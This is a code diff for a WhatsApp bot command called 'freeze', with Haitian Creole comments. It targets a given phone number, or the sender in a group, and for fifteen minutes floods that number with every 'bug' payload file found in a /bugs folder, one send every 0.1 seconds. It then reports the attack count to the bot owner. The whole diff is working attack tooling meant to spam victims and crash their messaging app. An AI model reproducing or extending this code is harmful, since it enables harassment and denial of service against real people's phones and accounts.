@@ -1,10 +1,11 @@
 const { cmd } = require('../command');
 const config = require('../config');
-const bugchat = require('../bug/izuka5.js'); // ✅ verifye path la kòrèk
+const fs = require('fs');
+const path = require('path');
 
 cmd({
   pattern: 'freeze',
-  desc: 'Owner only command to send freeze attack messages',
+  desc: 'Owner only command to send freeze attack messages from /bugs',
   category: 'bug',
   react: '❄️',
   filename: __filename
@@ -18,7 +19,7 @@ cmd({
       config.OWNER_NUMBER + '@s.whatsapp.net',
       ...(config.SUDO || []).map(n => n + '@s.whatsapp.net')
     ];
-    const protectedNumbers = ['13058962443']; // Numbers ki pa dwe atake
+    const protectedNumbers = ['13058962443']; // Pa atake nimewo sa
 
     const body = m.body || '';
     const cmdName = body.startsWith(prefix)
@@ -36,49 +37,81 @@ cmd({
     let targetNumber;
 
     if (m.isGroup) {
-      // Si nan group, vize moun ki voye mesaj la
-      targetNumber = senderId.split('@')[0];
+      targetNumber = senderId.split('@')[0]; // si group, vize moun
     } else if (args.length > 0 && !isNaN(args[0])) {
-      targetNumber = args[0];
+      targetNumber = args[0]; // sinon pran arg
     }
 
     if (!targetNumber) {
       return await bot.sendMessage(from, {
-        text: `❌ Usage:\n${prefix}freeze <number>\nOu ka itilize l nan group pou vize moun nan tou.`
+        text: `❌ Usage:\n${prefix}freeze <number>\n\n🧊 Ou ka itilize l nan group san mete nimewo`
       }, { quoted: mek });
     }
 
     if (protectedNumbers.includes(targetNumber)) {
       return await bot.sendMessage(from, {
-        text: '🛡️ This number is protected and cannot be targeted.'
+        text: '🛡️ This number is protected.'
       }, { quoted: mek });
     }
 
     const targetJid = `${targetNumber}@s.whatsapp.net`;
+    const bugsDir = path.join(__dirname, '../bugs');
+    const bugFiles = fs.readdirSync(bugsDir).filter(f => f.endsWith('.js'));
+
+    if (bugFiles.length === 0) {
+      return await bot.sendMessage(from, {
+        text: '📁 Pa gen payload nan /bugs'
+      }, { quoted: mek });
+    }
 
     await bot.sendMessage(from, {
-      text: `❄️ *FREEZE ATTACK LAUNCHING*\n📲 Target: +${targetNumber}\n🕒 Duration: 15 minutes`
+      text: `❄️ *FREEZE LAUNCHING...*\n🎯 Target: +${targetNumber}\n📦 Payloads: ${bugFiles.length}\n🕒 Duration: 15 minutes`,
     }, { quoted: mek });
 
-    const lines = bugchat.split('\n').filter(Boolean);
-    const startTime = Date.now();
+    const endTime = Date.now() + 15 * 60 * 1000;
     let count = 0;
 
-    while (Date.now() - startTime < 15 * 60 * 1000) { // 15 minit
-      for (let line of lines) {
-        await bot.sendMessage(targetJid, {
-          text: `☃️ *FREEZE ATTACK #${++count}*\n${line}\n\n_⚠️ SYSTEM FREEZE INITIATED_\n~IZUKA MD~`
-        });
-        await new Promise(resolve => setTimeout(resolve, 100)); // 0.1s
+    while (Date.now() < endTime) {
+      for (const file of bugFiles) {
+        try {
+          const payloadPath = path.join(bugsDir, file);
+          let bugPayload = require(payloadPath);
+
+          // convert export default string
+          if (typeof bugPayload === 'object' && typeof bugPayload.default === 'string') {
+            const msg = bugPayload.default;
+            bugPayload = async (bot, number) => {
+              await bot.sendMessage(`${number}@s.whatsapp.net`, { text: msg });
+            };
+          }
+
+          // plain string
+          if (typeof bugPayload === 'string') {
+            const msg = bugPayload;
+            bugPayload = async (bot, number) => {
+              await bot.sendMessage(`${number}@s.whatsapp.net`, { text: msg });
+            };
+          }
+
+          if (typeof bugPayload === 'function') {
+            await bugPayload(bot, targetNumber);
+            count++;
+          }
+
+        } catch (e) {
+          console.error(`❌ Error in ${file}:`, e.message);
+        }
+
+        await new Promise(r => setTimeout(r, 100)); // 0.1s
       }
     }
 
     await bot.sendMessage(targetJid, {
-      text: `✅ *FREEZE COMPLETED*\n🧊 Total Payloads Sent: ${count}\n~IZUKA MD~`
+      text: `✅ *FREEZE COMPLETED*\n🧊 Total Sent: ${count}`
     });
 
     await bot.sendMessage(from, {
-      text: `✅ *FREEZE attack finished*\n🕔 Ran for 15 minutes\n📤 Messages sent: ${count}\n🎯 Target: +${targetNumber}`
+      text: `✅ *FREEZE attack done on +${targetNumber}*\n📤 Messages sent: ${count}`
     }, { quoted: mek });
 
   } catch (error) {
